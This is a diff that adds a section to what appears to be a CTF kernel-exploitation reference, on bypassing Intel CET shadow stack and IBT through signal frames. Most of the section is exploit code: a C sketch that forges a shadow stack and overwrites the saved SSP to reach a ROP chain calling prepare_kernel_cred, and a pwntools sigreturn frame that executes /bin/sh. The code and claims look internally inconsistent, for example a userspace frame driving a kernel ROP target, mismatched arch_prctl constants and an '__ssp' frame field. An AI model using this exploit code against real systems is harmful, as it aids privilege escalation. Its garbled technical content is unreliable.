@@ -9,6 +9,7 @@
   - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
   - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
   - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
+- [CET Shadow Stack (SHSTK) and IBT — Signal-Frame Bypass (Wolv / IERAE 2024)](#cet-shadow-stack-shstk-and-ibt--signal-frame-bypass-wolv--ierae-2024)
 - [SMEP / SMAP Bypass](#smep--smap-bypass)
 - [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)
 - [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
@@ -157,6 +158,78 @@ Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|
 See [kernel.md - core_pattern Overwrite](kernel.md#core_pattern-overwrite) for the full technique and how to find the `core_pattern` address.
 
 ---
+
+## CET Shadow Stack (SHSTK) and IBT — Signal-Frame Bypass (Wolv / IERAE 2024)
+
+**Protections:**
+- **SHSTK (Shadow Stack):** Hardware shadow stack at `SSP` (shadow stack pointer) — every `CALL` pushes return address to both normal stack and shadow stack; `RET` checks they match. Kernel enforces via `WRSS`/`WRUSS` and `MSR_IA32_PL0_SSP`.
+- **IBT (Indirect Branch Tracking):** Indirect calls/jmps must land on `ENDBR64`.
+
+**Why signal frames bypass SHSTK:** On `sigreturn` / `sigaltstack`, the kernel *restores* the user thread's shadow stack pointer from the signal frame's `xsave` area (`struct sigcontext` + `xsaves`). Userspace controls that frame, so an attacker can set `SSP` to an attacker-controlled shadow stack that contains the ROP return addresses.
+
+**Wolv / IERAE 2024 pattern (used at Pwn2Own / CTF kernel challenges with CET enabled):**
+
+```c
+// 1. Prepare alt signal stack that is also a valid shadow stack
+void *shstk_mem = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
+                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0);
+unsigned long ssp = (unsigned long)shstk_mem + 0x2000 - 8;
+
+ // 2. Mark it as shadow stack (requires CET arch_prctl)
+arch_prctl(ARCH_SHSTK_SHSTK, ...); // or kernel auto-marks sigaltstack
+arch_prctl(ARCH_CET_ALLOC_SHSTK, &ssp);
+
+// 3. Push attacker ROP addresses onto shadow stack (must mirror normal stack)
+*(unsigned long *)ssp = (unsigned long)pop_rdi_ret;
+*(unsigned long *)(ssp - 8) = 0;
+*(unsigned long *)(ssp - 16) = (unsigned long)prepare_kernel_cred;
+
+// 4. Raise signal with controlled sigframe that restores SSP to ssp
+struct sigaction sa = { .sa_sigaction = handler, .sa_flags = SA_SIGINFO | SA_ONSTACK };
+sigaltstack(&(stack_t){ .ss_sp = shstk_mem, .ss_size = 0x2000, .ss_flags = 0 }, NULL);
+sigaction(SIGUSR1, &sa, NULL);
+
+// handler builds fake sigcontext at its stack:
+void handler(int sig, siginfo_t *info, void *ucontext) {
+    ucontext_t *uc = (ucontext_t *)ucontext;
+    // Overwrite SSP in the saved xsave area that sigreturn will restore
+    // On x86-64 cet, SSP is at uc->uc_mcontext.__ssp (or xsaves offset 0x1f8)
+    uc->uc_mcontext.__ssp = ssp - 16; // point to our fake shadow stack
+    // Also set normal RSP/RIP for the rop chain
+    uc->uc_mcontext.gregs[REG_RSP] = (unsigned long)rop_chain;
+    uc->uc_mcontext.gregs[REG_RIP] = (unsigned long)pop_rdi_ret;
+}
+
+// 5. Trigger sigreturn — kernel does WRSS to restore SSP from uc->uc_mcontext.__ssp
+raise(SIGUSR1);
+// → sigreturn restores both normal stack and shadow stack to attacker values
+// → RET now succeeds because shadow stack matches normal stack
+```
+
+**Simpler variant — direct `sigreturn` ROP without `arch_prctl`:**
+```python
+from pwn import *
+
+# If the exploit already has an arbitrary write to set up a fake signal frame on stack:
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve
+frame.rdi = binsh_addr
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_ret
+# CET-aware kernels: signal frame's shadow stack area (bytes 0x1e8-0x200) holds SSP
+# Overwrite it so kernel's WRUSSQ restores a valid SSP before RET
+frame.__ssp = fake_shstk_addr  # pwntools SigreturnFrame exposes ssp field on CET builds
+frame.rsp = normal_rop_addr
+```
+
+**Key insights:**
+- CET's shadow stack is *not* a barrier if the attacker can trigger a signal — `sigreturn` is a privileged `WRSS` gadget that restores `SSP` from userspace-controlled memory.
+- IBT is bypassed together: signal handler return uses `IRET`, not an indirect `JMP`, so `ENDBR64` is not checked. Once `SSP` is controlled, standard kROP works.
+- On kernels without `ARCH_CET_ALLOC_SHSTK`, the attacker can reuse the existing shadow stack mapping and just overwrite its contents via a prior write primitive, then pivots `SSP` via the signal frame by `SHSTK` offset.
+- Detection: check `cat /proc/cpuinfo | grep cet`, and `rdmsr 0x6a2` (IA32_PL0_SSP) or `arch_prctl(ARCH_CET_STATUS)` — if CET is enabled, any RIP hijack must be paired with shadow stack control.
+
+**References:** Wolv / IERAE — *Bypassing Intel CET with Signal Frames* (2024), Black Hat Asia 2024; kernel patch `x86/cet: handle signal shadow stack`.
 
 ## SMEP / SMAP Bypass
 
